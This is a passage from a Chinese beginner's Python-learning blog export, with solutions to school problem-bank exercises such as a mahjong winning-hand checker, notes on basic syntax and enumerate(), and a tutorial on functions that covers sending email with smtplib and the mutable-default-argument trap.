final_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> data1:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;-&#x27;</span> <span class="keyword">in</span> item:</span><br><span class="line">        gap = item.split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(gap[<span class="number">0</span>]),<span class="built_in">int</span>(gap[<span class="number">1</span>])+<span class="number">1</span>):</span><br><span class="line">            date1.append(<span class="built_in">int</span>(num))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        date1.append(<span class="built_in">int</span>(item))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(data2) <span class="keyword">not</span> <span class="keyword">in</span> date1 <span class="keyword">or</span> <span class="built_in">int</span>(data3) <span class="keyword">in</span> date1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not available&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    date1.remove(<span class="built_in">int</span>(data2))</span><br><span class="line">    date1.append(<span class="built_in">int</span>(data3))</span><br><span class="line">    date1.sort()</span><br><span class="line">    xinde = list_str(date1)</span><br><span class="line">    result = <span class="string">&#x27;,&#x27;</span>.join(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span> <span class="keyword">for</span> <span class="built_in">id</span> <span class="keyword">in</span> xinde)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="在列表中找出有相同度的最小连续子列表，输出其长度"><a href="#在列表中找出有相同度的最小连续子列表，输出其长度" class="headerlink" title="在列表中找出有相同度的最小连续子列表，输出其长度"></a>在列表中找出有相同度的最小连续子列表，输出其长度</h2><p><img src="/2022/02/19/%E4%B8%80%E3%80%81%E8%BF%9B%E9%98%B6py%EF%BC%9A%E9%80%9A%E5%85%B3%E4%B8%80%E4%B8%AA%E6%9F%90%E6%A0%A1%E7%9A%84%E9%A2%98%E5%BA%93/image-20220119205038551.png" alt="image-20220119205038551"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">da = <span class="built_in">input</span>()</span><br><span class="line">data = da.replace(<span class="string">&quot;[&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;]&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&quot;&quot;</span>).split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">oc_list = <span class="built_in">dict</span>()</span><br><span class="line"><span class="comment">#z把元素出现的次数输入到字典中</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">    oc_list.update(&#123;<span class="string">f&quot;<span class="subst">&#123;item&#125;</span>&quot;</span>:<span class="number">0</span>&#125;)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> data:</span><br><span class="line">    oc_list[<span class="string">f&quot;<span class="subst">&#123;item&#125;</span>&quot;</span>] += <span class="number">1</span></span><br><span class="line"><span class="comment">#j找到所有的出现次数最大的值</span></span><br><span class="line">maxitem_buffer = <span class="built_in">max</span>(oc_list,key=oc_list.get)</span><br><span class="line">maxitem = []</span><br><span class="line"><span class="keyword">for</span> key,value <span class="keyword">in</span> oc_list.items():</span><br><span class="line">    <span class="keyword">if</span> value == oc_list.get(maxitem_buffer):</span><br><span class="line">        maxitem.append(key)</span><br><span class="line"><span class="comment">#找到出现次数最大的元素的起始位置和最终位置</span></span><br><span class="line">index_buffer = []</span><br><span class="line">list_buffer = []</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> maxitem:</span><br><span class="line">    list_buffer.clear()</span><br><span class="line">    <span class="keyword">for</span> index,it <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(it) == <span class="built_in">int</span>(item):</span><br><span class="line">            list_buffer.append(index)</span><br><span class="line">    index_buffer.append(list_buffer)</span><br><span class="line"><span class="comment">#计算最短的长度</span></span><br><span class="line">len_buffer = []</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> index_buffer:</span><br><span class="line">    len_buffer.append(<span class="built_in">max</span>(item)-<span class="built_in">min</span>(item)+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">min</span>(len_buffer))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="判断麻将是否胡牌"><a href="#判断麻将是否胡牌" class="headerlink" title="判断麻将是否胡牌"></a>判断麻将是否胡牌</h1><p><img src="/2022/02/19/%E4%B8%80%E3%80%81%E8%BF%9B%E9%98%B6py%EF%BC%9A%E9%80%9A%E5%85%B3%E4%B8%80%E4%B8%AA%E6%9F%90%E6%A0%A1%E7%9A%84%E9%A2%98%E5%BA%93/image-20220125174147666.png" alt="image-20220125174147666"></p>
<p>笑死我了，我写了他妈一百多行代码，以后老板看到不把我骂死</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    data = <span class="built_in">input</span>()</span><br><span class="line">    data_list = data.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">nitian</span>(<span class="params">data_list</span>):</span></span><br><span class="line">        <span class="comment">#把他们全部放到c d s列表中</span></span><br><span class="line">        c_list = []</span><br><span class="line">        d_list = []</span><br><span class="line">        s_list = []</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> data_list:</span><br><span class="line">            <span class="keyword">if</span> item.endswith(<span class="string">&#x27;D&#x27;</span>):</span><br><span class="line">                d_list.append(item)</span><br><span class="line">            <span class="keyword">elif</span> item.endswith(<span class="string">&#x27;S&#x27;</span>):</span><br><span class="line">                s_list.append(item)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                c_list.append(item)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#要先找到连续的排再找到相同的排最后找做将的牌</span></span><br><span class="line">        <span class="comment">#定义一个找连续牌的函数,返回的是元组，第一个是n第二个是减去重复元素之后的列表</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">find_rconsecutive_data</span>(<span class="params">listx</span>):</span></span><br><span class="line">            item_buffer = []</span><br><span class="line">            result = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> indexs,itemx <span class="keyword">in</span> <span class="built_in">enumerate</span>(listx):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(item_buffer) == <span class="number">3</span>:</span><br><span class="line">                    result += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> item_buffer:</span><br><span class="line">                        listx.remove(i)</span><br><span class="line">                item_buffer.clear()</span><br><span class="line">                item_buffer.clear()</span><br><span class="line">                listx.sort()</span><br><span class="line">                item_buffer.append(itemx)</span><br><span class="line">                <span class="keyword">for</span> index,item <span class="keyword">in</span> <span class="built_in">enumerate</span>(listx):</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(item_buffer) &gt;= <span class="number">3</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">elif</span> <span class="built_in">int</span>(<span class="built_in">list</span>(item)[<span class="number">0</span>]) - <span class="built_in">int</span>(<span class="built_in">list</span>(item_buffer[-<span class="number">1</span>])[<span class="number">0</span>]) == <span class="number">1</span>:</span><br><span class="line">                        item_buffer.append(item)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> indexs,itemx <span class="keyword">in</span> <span class="built_in">enumerate</span>(listx):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(item_buffer) == <span class="number">3</span>:</span><br><span class="line">                    result += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> item_buffer:</span><br><span class="line">                        listx.remove(<span class="built_in">str</span>(i))</span><br><span class="line">                item_buffer.clear()</span><br><span class="line">                item_buffer.clear()</span><br><span class="line">                listx.sort()</span><br><span class="line">                item_buffer.append(itemx)</span><br><span class="line">                <span class="keyword">for</span> index,item <span class="keyword">in</span> <span class="built_in">enumerate</span>(listx):</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(item_buffer) &gt;= <span class="number">3</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">elif</span> <span class="built_in">int</span>(<span class="built_in">list</span>(item)[<span class="number">0</span>]) - <span class="built_in">int</span>(<span class="built_in">list</span>(item_buffer[-<span class="number">1</span>])[<span class="number">0</span>]) == <span class="number">1</span>:</span><br><span class="line">                        item_buffer.append(item)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> result,listx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        c = find_rconsecutive_data(c_list)</span><br><span class="line">        s = find_rconsecutive_data(s_list)</span><br><span class="line">        d = find_rconsecutive_data(d_list)</span><br><span class="line">        <span class="comment">##重置所有东西，开始检测三个相同类型的牌</span></span><br><span class="line">        new_data = c[<span class="number">1</span>]+s[<span class="number">1</span>]+d[<span class="number">1</span>]</span><br><span class="line">        n = <span class="built_in">int</span>(c[<span class="number">0</span>]) + <span class="built_in">int</span>(s[<span class="number">0</span>]) + <span class="built_in">int</span>(d[<span class="number">0</span>])</span><br><span class="line">        c_list = []</span><br><span class="line">        d_list = []</span><br><span class="line">        s_list = []</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> new_data:</span><br><span class="line">            <span class="keyword">if</span> item.endswith(<span class="string">&#x27;D&#x27;</span>):</span><br><span class="line">                d_list.append(item)</span><br><span class="line">            <span class="keyword">elif</span> item.endswith(<span class="string">&#x27;S&#x27;</span>):</span><br><span class="line">                s_list.append(item)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                c_list.append(item)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#定义一个函数检测列表中是不是有相同的牌,返回数字和删除相同元素之后的列表</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">find_repeat_data</span>(<span class="params">listx</span>):</span></span><br><span class="line">            buffer = []</span><br><span class="line">            result = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> indexs,items <span class="keyword">in</span> <span class="built_in">enumerate</span>(listx):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(buffer) &gt;= <span class="number">3</span>:</span><br><span class="line">                    result += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">for</span> itemxxx <span class="keyword">in</span> buffer:</span><br><span class="line">                        listx.remove(itemxxx)</span><br><span class="line">                    buffer.clear()</span><br><span class="line">                buffer.clear()</span><br><span class="line">                buffer.append(items)</span><br><span class="line">                <span class="keyword">for</span> index,item <span class="keyword">in</span> <span class="built_in">enumerate</span>(listx):</span><br><span class="line">                    <span class="keyword">if</span> index == indexs:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                    <span class="keyword">elif</span> <span class="built_in">len</span>(buffer) &gt;= <span class="number">3</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">elif</span> item == buffer[-<span class="number">1</span>]:</span><br><span class="line">                        buffer.append(item)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> indexs,items <span class="keyword">in</span> <span class="built_in">enumerate</span>(listx):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(buffer) &gt;= <span class="number">3</span>:</span><br><span class="line">                    result += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">for</span> itemxxx <span class="keyword">in</span> buffer:</span><br><span class="line">                        listx.remove(itemxxx)</span><br><span class="line">                    buffer.clear()</span><br><span class="line">                buffer.clear()</span><br><span class="line">                buffer.append(items)</span><br><span class="line">                <span class="keyword">for</span> index,item <span class="keyword">in</span> <span class="built_in">enumerate</span>(listx):</span><br><span class="line">                    <span class="keyword">if</span> index == indexs:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">                    <span class="keyword">elif</span> <span class="built_in">len</span>(buffer) &gt;= <span class="number">3</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">elif</span> item == buffer[-<span class="number">1</span>]:</span><br><span class="line">                        buffer.append(item)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> result,listx</span><br><span class="line"></span><br><span class="line">        <span class="comment">#再次重置东西，进行最后的做将判断</span></span><br><span class="line">        s = find_repeat_data(s_list)</span><br><span class="line">        c = find_repeat_data(c_list)</span><br><span class="line">        d = find_repeat_data(d_list)</span><br><span class="line">        DATA = s[<span class="number">1</span>]+c[<span class="number">1</span>]+d[<span class="number">1</span>]</span><br><span class="line">        n += s[<span class="number">0</span>]+c[<span class="number">0</span>]+d[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> n &gt;= <span class="number">4</span> <span class="keyword">and</span> <span class="built_in">len</span>(DATA) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;yes&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">zuojiang</span>(<span class="params">data_list</span>):</span></span><br><span class="line">        repeat = []</span><br><span class="line">        <span class="keyword">for</span> indexx,itemx <span class="keyword">in</span> <span class="built_in">enumerate</span>(data_list):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(repeat) == <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">for</span> re <span class="keyword">in</span> repeat:</span><br><span class="line">                    data_list.remove(re)</span><br><span class="line">                repeat.clear()</span><br><span class="line">                <span class="keyword">return</span> data_list</span><br><span class="line">            repeat.clear()</span><br><span class="line">            repeat.append(itemx)</span><br><span class="line">            <span class="keyword">for</span> index,item <span class="keyword">in</span> <span class="built_in">enumerate</span>(data_list):</span><br><span class="line">                <span class="keyword">if</span> index == indexx:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                <span class="keyword">elif</span> item == repeat[-<span class="number">1</span>]:</span><br><span class="line">                    repeat.append(item)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#做不同的将，但凡有一个yes，那么我们就成功了</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data_list)):</span><br><span class="line">        data_listx = [item <span class="keyword">for</span> item <span class="keyword">in</span> data_list]</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            result.append(nitian(zuojiang(data_listx)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                buffer_item = data_listx[<span class="number">0</span>:i]</span><br><span class="line">                <span class="keyword">del</span> data_listx[<span class="number">0</span>:i]</span><br><span class="line">                buffer_zuojiang = zuojiang(data_listx)</span><br><span class="line">                buffer_zuojiang += buffer_item</span><br><span class="line">                result.append(nitian( buffer_zuojiang))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result.append(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;yes&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-python</category>
      </categories>
  </entry>
  <entry>
    <title>一，学习py：{} 布尔 del insert input int（）字符串为空的判断 elif</title>
    <url>/2021/12/28/%E4%B8%80%EF%BC%8C%E5%AD%A6%E4%B9%A0py%EF%BC%9A-%E5%B8%83%E5%B0%94-del-insert-input-int%EF%BC%88%EF%BC%89%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%BA%E7%A9%BA%E7%9A%84%E5%88%A4%E6%96%AD-elif/</url>
    <content><![CDATA[<p>一，学习py：{} 布尔 del insert input int（）字符串为空的判断 elif</p>
<p>1.”a in b”返回布尔值，判断b列表中是否有a。</p>
<p>2.”x.insert(位置，”内容”)”在列表x中插入数据。</p>
<p>3.“del .x”可以用来删除变量和列表中的值。</p>
<p>4.input 读取的值都是字符串</p>
<p>5.使用“int”关键字来将变量转换为int类型，ex：print( int(a) )</p>
<p>6.使用“{}”在字符串中引用变量（需要在字符串最前面引号前面加上“f”）</p>
<p>7.关于字符串为空的判断</p>
<p>len(s) ==0</p>
<p>ex：len(s) ==0 则字符串为空if len(username) ==0 or len(password) == 0: #判断输入的用户名或密码是否为空</p>
<p>isspace判断是否字符串全部是空格</p>
<p>s.isspace() == Trueif username.isspace() or password.isspace(): #判断输入的用户名或密码是否为空</p>
<p>8.</p>
<p>去两边空格：str.strip()</p>
<p>去左空格：str.lstrip()</p>
<p>去右空格：str.rstrip()</p>
<p>去两边字符串：str.strip(‘d’)，相应的也有lstrip，rstrip。</p>
<p>9.”if”后面用冒号”:{}”</p>
<p>10.py中的else if = elif</p>
<p>参考文章：<a href="https://blog.csdn.net/weixin_39725118/article/details/111822050">https://blog.csdn.net/weixin_39725118/article/details/111822050</a></p>
]]></content>
      <categories>
        <category>-python</category>
      </categories>
  </entry>
  <entry>
    <title>三、py拓展：enumerate() 函数</title>
    <url>/2022/01/09/%E4%B8%89%E3%80%81py%E6%8B%93%E5%B1%95%EF%BC%9Aenumerate-%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="三、py拓展：enumerate-函数"><a href="#三、py拓展：enumerate-函数" class="headerlink" title="三、py拓展：enumerate() 函数"></a>三、py拓展：enumerate() 函数</h1><p>enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。</p>
<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>以下是 enumerate() 方法的语法:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">enumerate</span>(sequence, [start=<span class="number">0</span>])</span><br></pre></td></tr></table></figure>



<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,]</span><br><span class="line"><span class="keyword">for</span> i,item <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">list</span>):</span><br><span class="line">    <span class="built_in">print</span>(i,item)</span><br><span class="line">    </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0 2</span></span><br><span class="line"><span class="string">1 3</span></span><br><span class="line"><span class="string">2 4</span></span><br><span class="line"><span class="string">3 5</span></span><br><span class="line"><span class="string">4 5</span></span><br><span class="line"><span class="string">5 6</span></span><br><span class="line"><span class="string">6 7</span></span><br><span class="line"><span class="string">7 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-python</category>
      </categories>
  </entry>
  <entry>
    <title>七、学习py：函数</title>
    <url>/2022/01/03/%E4%B8%83%E3%80%81%E5%AD%A6%E4%B9%A0py%EF%BC%9A%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="七、学习py：函数"><a href="#七、学习py：函数" class="headerlink" title="七、学习py：函数"></a>七、学习py：函数</h1><p>人嘛了，这篇写到一半关机忘记保存了。</p>
<p>就简略写啦o(╥﹏╥)o</p>
<h2 id="1-初识函数"><a href="#1-初识函数" class="headerlink" title="1.初识函数"></a>1.初识函数</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dhk</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;joker!&quot;</span>)</span><br><span class="line"><span class="comment">#定义函数</span></span><br><span class="line">dhk()<span class="comment">#执行函数</span></span><br></pre></td></tr></table></figure>

<h3 id="1-1扩充功能，发送邮件"><a href="#1-1扩充功能，发送邮件" class="headerlink" title="1.1扩充功能，发送邮件"></a>1.1扩充功能，发送邮件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">from</span> email.utils <span class="keyword">import</span> formataddr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_email</span>():</span></span><br><span class="line">    <span class="comment"># 1.邮件内容配置</span></span><br><span class="line">    <span class="comment"># 邮件文本</span></span><br><span class="line">    msg = MIMEText(<span class="string">&quot;越江才学会用py发送邮件。&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment"># 邮件上显示的发信人</span></span><br><span class="line">    msg[<span class="string">&#x27;From&#x27;</span>] = formataddr([<span class="string">&quot;越江&quot;</span>, <span class="string">&quot;自己的邮箱&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 邮件上显示的主题</span></span><br><span class="line">    msg[<span class="string">&#x27;Subject&#x27;</span>] = <span class="string">&quot;猪哥好&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.发送邮件</span></span><br><span class="line">    server = smtplib.SMTP_SSL(<span class="string">&quot;smtp.qq.com#发信服务器&quot;</span>)</span><br><span class="line">    server.login(<span class="string">&quot;#自己的邮箱&quot;</span>, <span class="string">&quot;#授权码&quot;</span>)</span><br><span class="line">    server.sendmail(<span class="string">&quot;#自己的邮箱&quot;</span>, <span class="string">&quot;#对面的邮箱&quot;</span>, msg.as_string())</span><br><span class="line">    server.quit</span><br><span class="line"></span><br><span class="line">send_email()<span class="comment">#执行函数</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="2-参数"><a href="#2-参数" class="headerlink" title="2.参数"></a>2.参数</h2><p>在上述发邮件功能中，如果要对多人进行发送操作，一个一个发送略显复杂，所以可以将对方的邮件设置为参数，这样就能极大的提高代码的利用率。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dhk</span>(<span class="params">a</span>):</span><span class="comment">#这里的a为形式参数</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">dhk(joker)<span class="comment">#传入之后就是实际参数</span></span><br></pre></td></tr></table></figure>

<h3 id="2-1动态参数"><a href="#2-1动态参数" class="headerlink" title="2.1动态参数"></a>2.1动态参数</h3><h4 id="2-1-1-只能通过地址传递"><a href="#2-1-1-只能通过地址传递" class="headerlink" title="2.1.1*(只能通过地址传递)"></a>2.1.1*(只能通过地址传递)</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">*args</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line">func(<span class="number">1</span>,<span class="number">12</span>,<span class="number">123</span>,<span class="number">123</span>,<span class="number">321</span>)</span><br><span class="line"><span class="comment">#输出(1, 12, 123, 123, 321),元组类型</span></span><br></pre></td></tr></table></figure>

<h4 id="2-1-2-只能通过名称传递"><a href="#2-1-2-只能通过名称传递" class="headerlink" title="2.1.2**(只能通过名称传递)"></a>2.1.2**(只能通过名称传递)</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">**kwargs</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(kwargs)</span><br><span class="line">func(n1 = <span class="string">&quot;dhk&quot;</span>,n2 = <span class="string">&#x27;joker&#x27;</span>)<span class="comment">#&#123;&#x27;n1&#x27;: &#x27;dhk&#x27;, &#x27;n2&#x27;: &#x27;joker&#x27;&#125;</span></span><br><span class="line"><span class="comment">#输出字典</span></span><br></pre></td></tr></table></figure>

<h4 id="2-1-3-amp"><a href="#2-1-3-amp" class="headerlink" title="2.1.3*&amp;**"></a>2.1.3*&amp;**</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(args,kwargs)</span><br><span class="line">func(<span class="number">123</span>,n1=<span class="string">&quot;nihao&quot;</span>)<span class="comment">#(123,) &#123;&#x27;n1&#x27;: &#x27;nihao&#x27;&#125;</span></span><br><span class="line">func(<span class="number">123</span>)<span class="comment">#func(123)</span></span><br></pre></td></tr></table></figure>

<h4 id="2-1-4知识补充"><a href="#2-1-4知识补充" class="headerlink" title="2.1.4知识补充"></a>2.1.4知识补充</h4><p>在定义函数时可以用**和 *，其实在执行函数时，也可是使用。</p>
<p>形参固定，实参用**和 *</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">a1,a2</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(a1,a2)</span><br><span class="line">func(<span class="number">11</span>,<span class="number">22</span>)<span class="comment">#11 22</span></span><br><span class="line">func(*[<span class="number">11</span>,<span class="number">22</span>])<span class="comment">#11 22</span></span><br><span class="line"></span><br><span class="line">func(a1=<span class="number">1</span>,a2=<span class="number">2</span>)<span class="comment">#1 2</span></span><br><span class="line">func(**&#123;<span class="string">&quot;a1&quot;</span>:<span class="number">1</span>,<span class="string">&quot;a2&quot;</span>:<span class="number">2</span>&#125;)<span class="comment">#1 2</span></span><br></pre></td></tr></table></figure>

<p>形参中用了* <em>和 <em>，实参也用了</em></em> 和 *</p>
<h3 id="2-2默认参数"><a href="#2-2默认参数" class="headerlink" title="2.2默认参数"></a>2.2默认参数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">a,b=<span class="number">123</span></span>):</span><span class="comment">#这里的b就是默认参数，可以输入可以不输入，如果没有输入就是默认值。</span></span><br><span class="line">    <span class="built_in">print</span>(a,b)</span><br></pre></td></tr></table></figure>

<h4 id="2-2-1参数的默认值【面试题】有坑"><a href="#2-2-1参数的默认值【面试题】有坑" class="headerlink" title="2.2.1参数的默认值【面试题】有坑"></a>2.2.1参数的默认值【面试题】有坑</h4><p>这个知识点在面试题中出现的概率比较高，但真正实际开发中用的比较少。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">a1,a2=<span class="number">18</span></span>):</span></span><br><span class="line">    <span class="built_in">print</span>(a1,a2)</span><br></pre></td></tr></table></figure>

<p>原理：python在创建函数（未执行）时，如果发现函数的参数中有默认值，则在函数内部会创建一块区域并维护这个默认值。</p>
<p>执行函数未传值时，则让a2指向函数维护的那个值的地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">func(<span class="string">&quot;dhk&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>执行函数传值时，则让a2指向新传入的值的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">func(<span class="string">&quot;adhk&quot;</span>,<span class="number">123</span>)</span><br></pre></td></tr></table></figure>



<p>在特定情况【默认参数的值是可变类型(列表，字典，集合)】&amp;【函数内部会修改这个值】下，参数的默认值 有坑！超级大坑！！！！</p>
<p>小坑</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在内存中会维护一块区域，维护[],而这个地址在每次函数执行的时候不会重新创建，在加载的时候就创建好了。所以每一次执行的时候都是使用的默认值的维护地址，就导致了下面的情况！！！</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">a1,a2=[]</span>):</span></span><br><span class="line">    a2.append(<span class="number">666</span>)</span><br><span class="line">    <span class="built_in">print</span>(a1,a2,<span class="built_in">id</span>(a2))</span><br><span class="line"></span><br><span class="line">func(<span class="number">123</span>)<span class="comment">#123 [666] 2791287502016</span></span><br><span class="line">func(<span class="number">321</span>)<span class="comment">#321 [666, 666] 2791287502016</span></span><br><span class="line">func(<span class="number">33</span>,[<span class="number">77</span>,<span class="number">66</span>])<span class="comment">#33 [77, 66, 666] 2791287504768</span></span><br><span class="line">func(<span class="number">300</span>)<span class="comment">#300 [666, 666, 666] 2791287502016</span></span><br></pre></td></tr></table></figure>

<p>大坑</p>
